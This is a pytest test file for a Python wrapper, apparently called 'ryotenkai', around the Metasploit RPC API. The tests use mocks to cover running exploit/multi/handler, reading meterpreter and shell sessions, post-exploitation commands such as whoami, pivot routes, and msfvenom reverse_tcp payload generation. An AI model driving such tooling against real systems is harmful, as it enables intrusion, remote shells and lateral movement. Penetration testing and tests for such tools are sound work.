import ryotenkai
from unittest.mock import MagicMock


def test_module_imports():
    assert hasattr(ryotenkai, "load_config")


def test_get_jobs_returns_dict(mock_client):
    mock_client.jobs.list = {"0": "Exploit: multi/handler"}
    assert ryotenkai.get_jobs(mock_client) == {"0": "Exploit: multi/handler"}


def test_get_job_details_enriches_from_info(mock_client):
    mock_client.jobs.list = {"0": "Exploit: multi/handler"}
    mock_client.jobs.info.return_value = {
        "name": "Exploit: multi/handler",
        "datastore": {"PAYLOAD": "windows/meterpreter/reverse_tcp",
                      "LHOST": "10.0.0.1", "LPORT": "4444"},
    }
    out = ryotenkai.get_job_details(mock_client)
    mock_client.jobs.info.assert_called_once_with("0")
    assert out == {"0": {"name": "Exploit: multi/handler",
                         "payload": "windows/meterpreter/reverse_tcp",
                         "lhost": "10.0.0.1", "lport": "4444"}}


def test_get_job_details_case_insensitive_datastore(mock_client):
    mock_client.jobs.list = {"3": "Exploit: multi/handler"}
    mock_client.jobs.info.return_value = {
        "datastore": {"payload": "linux/x64/meterpreter/reverse_tcp",
                      "lhost": "10.0.0.9", "lport": "9001"},
    }
    out = ryotenkai.get_job_details(mock_client)
    assert out["3"]["payload"] == "linux/x64/meterpreter/reverse_tcp"
    assert out["3"]["lhost"] == "10.0.0.9" and out["3"]["lport"] == "9001"


def test_get_job_details_filters_by_id(mock_client):
    mock_client.jobs.list = {"0": "handler", "1": "web_delivery"}
    mock_client.jobs.info.return_value = {"datastore": {}}
    out = ryotenkai.get_job_details(mock_client, "1")
    assert list(out.keys()) == ["1"]
    mock_client.jobs.info.assert_called_once_with("1")


def test_get_job_details_unknown_id_is_empty(mock_client):
    mock_client.jobs.list = {"0": "handler"}
    assert ryotenkai.get_job_details(mock_client, "9") == {}
    mock_client.jobs.info.assert_not_called()


def test_get_job_details_survives_bad_job(mock_client):
    mock_client.jobs.list = {"0": "handler"}
    mock_client.jobs.info.side_effect = RuntimeError("boom")
    out = ryotenkai.get_job_details(mock_client)
    assert out == {"0": {"name": "handler", "payload": "N/A",
                         "lhost": "N/A", "lport": "N/A"}}


def test_get_sessions_returns_dict(mock_client):
    mock_client.sessions.list = {"1": {"type": "meterpreter"}}
    assert ryotenkai.get_sessions(mock_client) == {"1": {"type": "meterpreter"}}


def test_kill_job_calls_stop_and_reports(mock_client):
    result = ryotenkai.kill_job(mock_client, "2")
    mock_client.jobs.stop.assert_called_once_with("2")
    assert result["status"] == "success"
    assert "2" in result["message"]


def test_make_client_passes_args(monkeypatch):
    captured = {}

    def fake_client(password, server, port, ssl):
        captured.update(password=password, server=server, port=port, ssl=ssl)
        return "CLIENT"

    monkeypatch.setattr(ryotenkai, "MsfRpcClient", fake_client)
    out = ryotenkai.make_client("pw", "1.2.3.4", 55552, True)
    assert out == "CLIENT"
    assert captured == {"password": "pw", "server": "1.2.3.4", "port": 55552, "ssl": True}


def test_read_console_polls_until_not_busy(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    console = MagicMock()
    console.read.side_effect = [
        {"data": "line1\n", "busy": True},
        {"data": "line2\n", "busy": False},
    ]
    assert ryotenkai._read_console(console, timeout=5, interval=0) == "line1\nline2\n"


def test_read_session_stops_when_quiet(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    session = MagicMock()
    session.read.side_effect = ["uid=0\n", "", ""]
    out = ryotenkai._read_session(session, timeout=5, interval=0, quiet_rounds=2)
    assert out == "uid=0\n"


def test_run_exploit_returns_success(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    client = MagicMock()
    console = client.consoles.console.return_value
    console.read.side_effect = [{"data": "PID 1234\n", "busy": False}]
    result = ryotenkai.run_exploit(client, "exploit/multi/handler", {"LHOST": "10.0.0.1"})
    assert result["status"] == "success"
    assert result["module"] == "exploit/multi/handler"
    assert "PID 1234" in result["raw_output"]


def test_run_exploit_forwards_timeout(monkeypatch):
    captured = {}

    def fake_read(console, timeout=ryotenkai.CONSOLE_TIMEOUT, interval=ryotenkai.POLL_INTERVAL):
        captured["timeout"] = timeout
        return "PID 1234\n"

    monkeypatch.setattr(ryotenkai, "_read_console", fake_read)
    client = MagicMock()
    result = ryotenkai.run_exploit(client, "exploit/multi/handler",
                                   {"LHOST": "10.0.0.1"}, timeout=42)
    assert captured["timeout"] == 42
    assert result["status"] == "success"


def test_run_exploit_default_timeout(monkeypatch):
    captured = {}

    def fake_read(console, timeout=ryotenkai.CONSOLE_TIMEOUT, interval=ryotenkai.POLL_INTERVAL):
        captured["timeout"] = timeout
        return "ok\n"

    monkeypatch.setattr(ryotenkai, "_read_console", fake_read)
    ryotenkai.run_exploit(MagicMock(), "x", {})
    assert captured["timeout"] == ryotenkai.CONSOLE_TIMEOUT


def test_run_exploit_handles_rpc_error():
    client = MagicMock()
    client.consoles.console.side_effect = ryotenkai.MsfRpcError("boom")
    result = ryotenkai.run_exploit(client, "x", {})
    assert result["status"] == "error"
    assert "boom" in result["message"]


def test_run_session_command_reads_output(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    client = MagicMock()
    session = client.sessions.session.return_value
    session.read.side_effect = ["root\n", "", ""]
    out = ryotenkai.run_session_command(client, "4", "whoami")
    session.write.assert_called_once_with("whoami\n")
    assert out == "root\n"


def test_read_console_timeout_breaks(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    console = MagicMock()
    console.read.side_effect = [
        {"data": "partial\n", "busy": True},
        {"data": "more\n", "busy": True},
    ]
    out = ryotenkai._read_console(console, timeout=0, interval=0)
    assert out == "partial\n"
    assert console.read.call_count == 1


def test_read_session_timeout_breaks(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    session = MagicMock()
    session.read.side_effect = ["chunk\n", "chunk2\n"]
    out = ryotenkai._read_session(session, timeout=0, interval=0, quiet_rounds=5)
    assert out == "chunk\n"
    assert session.read.call_count == 1


def test_read_session_waits_for_first_byte(monkeypatch):
    # Slow session: two empty polls BEFORE any output. The old single-phase loop
    # broke on quiet_rounds=2 and returned "" here; the two-phase loop must wait.
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    session = MagicMock()
    session.read.side_effect = ["", "", "uid=0\n", "", ""]
    out = ryotenkai._read_session(session, timeout=30, interval=0, quiet_rounds=2,
                                  first_byte_timeout=30)
    assert out == "uid=0\n"
    assert session.read.call_count == 5


def test_read_session_no_output_returns_after_first_byte_timeout(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    session = MagicMock()
    session.read.side_effect = ["", "", ""]
    out = ryotenkai._read_session(session, timeout=30, interval=0, quiet_rounds=2,
                                  first_byte_timeout=0)
    assert out == ""
    assert session.read.call_count == 1


def test_run_session_command_forwards_read_params(monkeypatch):
    captured = {}

    def fake_read(session, **kw):
        captured.update(kw)
        return "x"

    monkeypatch.setattr(ryotenkai, "_read_session", fake_read)
    client = MagicMock()
    ryotenkai.run_session_command(client, "4", "sysinfo", timeout=30,
                                  first_byte_timeout=15, quiet_rounds=6)
    assert captured == {"timeout": 30, "first_byte_timeout": 15, "quiet_rounds": 6}
    client.sessions.session.return_value.write.assert_called_once_with("sysinfo\n")


def test_read_params_for_type_meterpreter_vs_shell():
    met = ryotenkai._read_params_for_type("meterpreter")
    assert met["timeout"] == ryotenkai.SESSION_METERPRETER_TIMEOUT
    assert met["first_byte_timeout"] == ryotenkai.SESSION_METERPRETER_FIRST_BYTE_TIMEOUT
    shell = ryotenkai._read_params_for_type("shell")
    assert shell["timeout"] == ryotenkai.SESSION_TIMEOUT
    assert shell["first_byte_timeout"] == ryotenkai.SESSION_FIRST_BYTE_TIMEOUT
    # Unknown/empty type falls back to the fast shell window.
    assert ryotenkai._read_params_for_type("") == shell


def test_session_type_reads_from_session_list(mock_client):
    mock_client.sessions.list = {"4": {"type": "meterpreter"}}
    assert ryotenkai._session_type(mock_client, "4") == "meterpreter"
    assert ryotenkai._session_type(mock_client, "9") == ""


def test_session_read_params_selects_by_type(mock_client):
    mock_client.sessions.list = {"4": {"type": "meterpreter"}, "5": {"type": "shell"}}
    assert ryotenkai._session_read_params(mock_client, "4")["quiet_rounds"] == \
        ryotenkai.SESSION_METERPRETER_QUIET_ROUNDS
    assert ryotenkai._session_read_params(mock_client, "5")["quiet_rounds"] == \
        ryotenkai.SESSION_QUIET_ROUNDS


def test_access_session_uses_type_params(monkeypatch, mock_client):
    mock_client.sessions.list = {"4": {"type": "meterpreter"}}
    seen = []
    monkeypatch.setattr(ryotenkai, "run_session_command",
                        lambda client, sid, cmd, **kw: seen.append(kw) or f"out:{cmd}")
    ryotenkai.access_session(mock_client, "4", ["sysinfo", "getuid"])
    assert len(seen) == 2
    assert all(kw["timeout"] == ryotenkai.SESSION_METERPRETER_TIMEOUT for kw in seen)


def test_run_console_cmd_returns_output(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    client = MagicMock()
    console = client.consoles.console.return_value
    console.read.side_effect = [{"data": "Framework: 6.4.0\n", "busy": False}]
    result = ryotenkai.run_console_cmd(client, "version")
    console.write.assert_called_once_with("version\n")
    console.destroy.assert_called_once()
    assert result["status"] == "success"
    assert result["command"] == "version"
    assert "6.4.0" in result["raw_output"]


def test_run_console_cmd_handles_rpc_error():
    client = MagicMock()
    client.consoles.console.side_effect = ryotenkai.MsfRpcError("boom")
    result = ryotenkai.run_console_cmd(client, "version")
    assert result["status"] == "error"
    assert "boom" in result["message"]


ROUTE_PRINT_OUTPUT = (
    "IPv4 Active Routing Table\n"
    "=========================\n"
    "\n"
    "   Subnet             Netmask            Gateway\n"
    "   ------             -------            -------\n"
    "   10.1.1.0           255.255.255.0      Session 1\n"
    "   10.2.2.0           255.255.255.0      Session 2\n"
)


def test_parse_routes_extracts_rows():
    routes = ryotenkai.parse_routes(ROUTE_PRINT_OUTPUT)
    assert routes == [
        {"subnet": "10.1.1.0", "netmask": "255.255.255.0", "gateway": "Session 1"},
        {"subnet": "10.2.2.0", "netmask": "255.255.255.0", "gateway": "Session 2"},
    ]


def test_parse_routes_handles_no_routes():
    assert ryotenkai.parse_routes(
        "[*] There are currently no routes defined.\n") == []


def test_get_routes_drives_console(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    client = MagicMock()
    console = client.consoles.console.return_value
    console.read.side_effect = [{"data": ROUTE_PRINT_OUTPUT, "busy": False}]
    routes = ryotenkai.get_routes(client)
    console.write.assert_called_once_with("route print\n")
    console.destroy.assert_called_once()
    assert len(routes) == 2
    assert routes[0]["subnet"] == "10.1.1.0"


def test_add_route_writes_command(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    client = MagicMock()
    console = client.consoles.console.return_value
    console.read.side_effect = [{"data": "", "busy": False}]
    result = ryotenkai.add_route(client, "10.1.1.0", "255.255.255.0", "1")
    console.write.assert_called_once_with("route add 10.1.1.0 255.255.255.0 1\n")
    assert result["status"] == "success"
    assert "10.1.1.0" in result["message"]


def test_remove_route_writes_command(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    client = MagicMock()
    console = client.consoles.console.return_value
    console.read.side_effect = [{"data": "", "busy": False}]
    ryotenkai.remove_route(client, "10.1.1.0", "255.255.255.0", "1")
    console.write.assert_called_once_with("route remove 10.1.1.0 255.255.255.0 1\n")


def test_flush_routes_writes_command(monkeypatch):
    monkeypatch.setattr(ryotenkai.time, "sleep", lambda *_: None)
    client = MagicMock()
    console = client.consoles.console.return_value
    console.read.side_effect = [{"data": "", "busy": False}]
    result = ryotenkai.flush_routes(client)
    console.write.assert_called_once_with("route flush\n")
    assert result["status"] == "success"


def test_parse_options_equals_form():
    assert ryotenkai.parse_options(["LHOST=10.0.0.1", "LPORT=4444"]) == {
        "LHOST": "10.0.0.1",
        "LPORT": "4444",
    }


def test_parse_options_space_form():
    assert ryotenkai.parse_options(["LHOST 10.0.0.1"]) == {"LHOST": "10.0.0.1"}


def test_generate_payload_success(monkeypatch):
    calls = {}
    monkeypatch.setattr(ryotenkai.subprocess, "run",
                        lambda cmd, check: calls.setdefault("cmd", cmd))
    result = ryotenkai.generate_payload("elf", "linux/x64/meterpreter/reverse_tcp",
                                        "10.0.0.1", "4444", "out.elf")
    assert result["status"] == "success"
    assert "msfvenom" in calls["cmd"][0]
    assert "out.elf" in calls["cmd"]


def test_generate_payload_error(monkeypatch):
    def boom(cmd, check):
        raise ryotenkai.subprocess.CalledProcessError(1, cmd)
    monkeypatch.setattr(ryotenkai.subprocess, "run", boom)
    result = ryotenkai.generate_payload("elf", "p", "1", "2", "o")
    assert result["status"] == "error"
